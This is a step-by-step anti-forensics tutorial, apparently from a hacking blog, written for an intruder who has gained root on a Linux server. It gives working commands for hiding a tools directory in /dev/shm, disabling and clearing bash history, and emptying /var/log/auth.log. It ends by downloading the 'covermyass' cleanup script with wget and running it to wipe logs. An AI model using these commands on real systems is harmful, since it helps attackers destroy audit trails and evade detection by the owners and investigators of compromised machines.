### **STEP 1: ESTABLISH CONTROL OVER THE TARGET SYSTEM**

The initial phase in compromising a target system is to gain control, typically through vulnerabilities like command injection. Command injection exploits allow you to execute arbitrary operating system commands on the server, which can lead to obtaining a shell. A fully interactive shell is essential for smooth operation, as it provides features like command history and tab completion, making your tasks easier to manage and more efficient.

### **STEP 2: CREATE A HIDDEN AND EASILY REMOVABLE DIRECTORY**

Once you've secured root access, it's prudent to set up a hidden directory where you can store your tools, scripts, and other files necessary for maintaining control over the system. Although creating a hidden directory won't deceive a seasoned administrator, it adds an extra layer of security against casual inspections.

1.  Start by identifying directories that are writable:  
    `root@hackfast:/# find / -perm -222 -type d 2>/dev/null`  
    **NOTE:**  Some common writable directories you might find include `/dev/shm`, `/tmp`, and `/var/tmp`.
    
2.  Next, create a hidden directory within one of these writable locations:  
    `root@hackfast:/# mkdir /dev/shm/.hidden`
    
3.  This directory will remain invisible during a normal `ls` command, appearing only when you use the `-a` flag:  
    `root@hackfast:/# ls -la /dev/shm/`
    
4.  To remove the directory after you're done, use:  
    `root@hackfast:/# rmdir /dev/shm/.hidden/`
    

### **STEP 3: ERASE COMMAND HISTORY TO AVOID DETECTION**

1.  Bash history is a record of the commands you execute during your session, which could be used to trace your activities. To ensure your tracks are covered, you need to clear or disable the command history. Begin by viewing the current session's history:  
    `root@hackfast:/# history`
    
2.  To stop the history from being recorded, unset the `HISTFILE` environment variable:  
    `root@hackfast:/# unset HISTFILE`
    
3.  This command disables the history logging by removing the file path where history is stored. Alternatively, you can redirect the history to `/dev/null` so that it is not saved anywhere:
    
    ```
    root@hackfast:/# HISTFILE=/dev/null
    root@hackfast:/# export HISTFILE=/dev/null
    ```
    
4.  Additionally, reduce the history size to zero to ensure no commands are logged:
    
    ```
    root@hackfast:/# HISTSIZE=0
    root@hackfast:/# export HISTSIZE=0
    ```
    
5.  These commands ensure that no history is recorded during your session. For a thorough cleanup, clear the current session's history with:  
    `root@hackfast:/# history -c`
    
6.  And write the changes to disk to make them permanent:  
    `root@hackfast:/# history -w`
    

### **STEP 4: CLEAR SYSTEM LOG FILES TO ERASE EVIDENCE**

System logs are another potential source of evidence. Logs such as `/var/log/auth.log` contain crucial information about authentication events and other system activities. Simply deleting these logs could raise suspicion, so it's better to clear their content without removing the files themselves.

1.  You can use the truncate command to empty a log file without deleting it:  
    `root@hackfast:/# truncate -s 0 /var/log/auth.log`
    
2.  If the truncate command is not available, you can achieve the same result with:  
    `root@hackfast:/# echo '' > /var/log/auth.log` or `root@hackfast:/# > /var/log/auth.log`  
    **NOTE:** These methods effectively erase the contents of the log files, reducing the likelihood of detection.
    

### **STEP 5: USE AUTOMATED TOOLS FOR COMPREHENSIVE CLEANUP**

1.  For a more extensive and automated cleanup, consider using tools like CoverMyAss. This script automates many of the processes discussed, including clearing logs and disabling Bash history. Download the script with `wget`:  
    `root@hackfast:/# wget https://raw.githubusercontent.com/sundowndev/covermyass/master/covermyass`
    
2.  Make the script executable:  
    `root@hackfast:/tmp# chmod +x covermyass`
    
3.  Run the script and follow the on-screen prompts to clear logs, disable history, or perform other cleanup tasks:  
    `root@hackfast:/tmp# ./covermyass`
    
4.  If you need to clear everything quickly, you can run the script with the `now` option:  
    `root@hackfast:/tmp# ./covermyass now`  
    **NOTE:** This option instantly clears logs and removes traces of your activity.